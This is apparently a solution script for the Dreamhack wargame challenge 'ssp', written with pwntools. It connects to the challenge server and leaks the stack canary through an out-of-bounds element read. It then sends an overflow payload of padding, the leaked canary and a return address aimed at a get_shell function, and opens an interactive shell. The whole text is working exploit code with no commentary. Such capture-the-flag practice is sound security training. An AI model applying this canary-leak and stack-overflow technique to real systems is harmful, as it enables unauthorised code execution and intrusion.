from pwn import *

p=remote('host3.dreamhack.games', 23533)
e=ELF("ssp")
get_shell=e.symbols['get_shell']

cnry=b''
for i in range(131,127,-1):
    p.sendlineafter("> ", "P")
    p.sendlineafter("Element index : ", str(i))
    p.recvuntil("is : ")
    cnry+=p.recvn(2)
    
cnry=int(cnry, 16)
pl=b"A"*64+p32(cnry)+b"A"*8+p32(0x80486b9)
p.sendlineafter("> ", "E")
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", pl)
print(cnry)
p.interactive()